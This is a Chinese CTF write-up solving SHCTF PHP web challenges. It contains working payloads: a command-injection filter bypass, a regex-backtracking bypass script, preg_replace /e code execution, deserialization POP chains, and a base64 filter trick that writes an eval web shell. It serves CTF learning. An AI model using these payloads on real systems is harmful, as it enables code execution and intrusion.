## Week1

### babyRCE

```php
<?php
$rce = $_GET['rce'];
if (isset($rce)) {
    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
        system($rce);
    }else {
            echo "hhhhhhacker!!!"."\n";
    }
} else {
    highlight_file(__FILE__);
}
```

过滤了空格和一些参数，可以用`${IFS}`绕过空格，转义符`\`绕过参数过滤

[RCE总结](https://www.freebuf.com/articles/web/330736.html)

payload：

```
ca\t${IFS}/fl\ag
```

### 1zzphp

```php
<?php 
error_reporting(0);
highlight_file('./index.txt');
if(isset($_POST['c_ode']) && isset($_GET['num']))
{
    $code = (String)$_POST['c_ode'];
    $num=$_GET['num'];
    if(preg_match("/[0-9]/", $num)) //数组绕过，传入数组是返回false
    {
        die("no number!");
    }
    elseif(intval($num)) //传入数组会返回1
    {
      if(preg_match('/.+?SHCTF/is', $code))
      {
        die('no touch!');
      }
      if(stripos($code,'2023SHCTF') === FALSE)
      {
        die('what do you want');
      }
      echo $flag;
    }
}
```

这题利用正则最大回溯绕过，`.+?`是正则表达式的贪婪模式

[利用正则回溯最大次数上限绕过preg_match](https://xz.aliyun.com/t/10219)

绕过脚本

```
import requests

payload = {
    'c_ode': 'v' * 1000000+'2023SHCTF'
}

url = 'http://112.6.51.212:30933/?num[]=1'

res = requests.post(url=url,data=payload)
print(res.text)
```

### ezphp

```
$code=$_GET['code'];
preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code); 
```

这题主要是`preg_replace`函数的/e模式可以执行代码

payload：

```
$patrern=\S*  \S代表匹配非空字符
$code=${phpinfo()}
```

贴个链接

[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

为什么是`{phpinfo()}`

这里是php可变变量问题，`{}`会获取`{}`内的值当作变量解析

`\\1`这里其实就是`\1`，\1在在正则表达式中有自己的含义

贴 [**W3Cschool**](https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html) 

```
反向引用
  对一个正则表达式模式或部分模式 两边添加圆括号将导致相关匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。
```

根据上面的解释，那这里的\1就是第一个匹配项，最后的语句是

`preg_replace('/(\S*)/ei', 'print_r("\\1")', ${phpinfo()});`

## Week2

### serialize

构造pop链

```php
<?php
class misca{
    public $gao;
    public $fei;
    public $a;
    public function __get($key){
        $this->miaomiao();
        $this->gao=$this->fei;
        die($this->a);
    }
    public function miaomiao(){
        $this->a='Mikey Mouse~';
    }
}
class musca{
    public $ding;
    public $dong;
    public function __wakeup(){
        return $this->ding->dong;
    }
}
class milaoshu{
    public $v='php://filter/convert.base64-encode/resource=flag.php';
    public function __tostring(){
        echo"misca~musca~milaoshu~~~";
        include($this->v);
    }
}
$c = new musca();
$c->ding = new misca();
$c->ding->fei = new milaoshu();
$c->ding->a = &$c->ding->gao;
$b = serialize($c);
echo serialize(array($c));
?>
```

这题最重要的就是绕过if(preg_match('/^O:\d+/',$data))

这里用+能绕过但是代码不能执行，还可以用数组绕过

[关于正则匹配preg_match(‘/^O:\d+/‘)的绕过的几种方法](http://t.csdnimg.cn/eWViq)

payload：

```php
a:1:{i:0;O:5:"musca":2:{s:4:"ding";O:5:"misca":3:{s:3:"gao";N;s:3:"fei";O:8:"milaoshu":1:{s:1:"v";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:1:"a";R:4;}s:4:"dong";N;}}
```

### MD5的事就拜托了

```php
 <?php
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['SHCTF'])){
    extract(parse_url($_POST['SHCTF']));
    if($$$scheme==='SHCTF'){
        echo(md5($flag));
        echo("</br>");
    }
    if(isset($_GET['length'])){
        $num=$_GET['length'];
        if($num*100!=intval($num*100)){
            echo(strlen($flag));
            echo("</br>");
        }
    }
}
if($_POST['SHCTF']!=md5($flag)){
    if($_POST['SHCTF']===md5($flag.urldecode($num))){
        echo("flag is".$flag);
    }
}
```

参考：

[parse_url函数的解释和绕过](http://t.csdnimg.cn/K7DDF)

[Hash拓展长度攻击原理剖析](https://www.freebuf.com/articles/database/164019.html)

[官方WP](https://mp.weixin.qq.com/s/pRGy_yEmyjgTgygEiLSSug)

```php
<?php
$url = 'host://SHCTF:pass@user/1';
print_r(parse_url($url));
?>
```

输出：

```
Array
(
    [scheme] => host
    [host] => user
    [user] => SHCTF
    [pass] => pass
    [path] => /1
)
```

输入参数

```
POST:
SHCTF=host://SHCTF:pass@user/1   //得到flag的MD5
GET:
length=1.001  //得到长度
```

最后一段

```php
if($_POST['SHCTF']!=md5($flag)){
    if($_POST['SHCTF']===md5($flag.urldecode($num))){
        echo("flag is".$flag);
    }
}
```

看别人说是，哈希拓展攻击，然后在网上找一个脚本[hash-ext-attack攻击脚本](https://github.com/shellfeel/hash-ext-attack)

![image-20231107132329008](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231107132329008.png)

得到flag

![image-20231107132425140](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231107132425140.png)

## WEEK3

### sseerriiaalliizzee

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);

class Start{
    public $barking;
    public function __construct(){
        $this->barking = new Flag;
    }
    public function __toString(){
            return $this->barking->dosomething();
    }
}
class CTF{ 
    public $part1;
    public $part2;
    public function __construct($part1='',$part2='') {
        $this -> part1 = $part1;
        $this -> part2 = $part2;
    }
    public function dosomething(){
        $useless   = '<?php die("+Genshin Impact Start!+");?>';
        $useful= $useless. $this->part2;
        file_put_contents($this-> part1,$useful);
    }
}
class Flag{
    public function dosomething(){
        include('./flag,php');
        return "barking for fun!";
    }
}
    $code=$_POST['code']; 
    if(isset($code)){
       echo unserialize($code);
    }
    else{
        echo "no way, fuck off";
    }
?> 
```

pop链是：Start::__tostring->CTF::dosomething

[file_put_contents利用技巧(php://filter协议）](https://www.cnblogs.com/yokan/p/12650702.html)

当我们执行到die函数是就会被终止

```
<?php die("+Genshin Impact Start!+");?>中，base64编码中只包含64个可打印字符（A-Z a-z 0-9 + /）'='补位，能base64解码的字符一共有26个phpdie+GenshinImpactStart+，需要在往里添加两个字符，然后再写进去要执行的命令
```

```php
<?php
class Start{
    public $barking;
}
class CTF{
    public $part1;
    public $part2;
}
class Flag{}
$a = new Start();
$a->barking = new CTF();
$a->barking->part1 = 'php://filter/write=convert.base64-decode/resource=cmd.php';
$a->barking->part2 = '66'.base64_encode('<?php eval($_GET["cmd"]); ?>');
echo serialize($a);
?>
```

payload：

```
O:5:"Start":1:{s:7:"barking";O:3:"CTF":2:{s:5:"part1";s:57:"php://filter/write=convert.base64-decode/resource=cmd.php";s:5:"part2";s:42:"66PD9waHAgZXZhbCgkX0dFVFsiY21kIl0pOyA/Pg==";}}
```

然后获取flag就行了
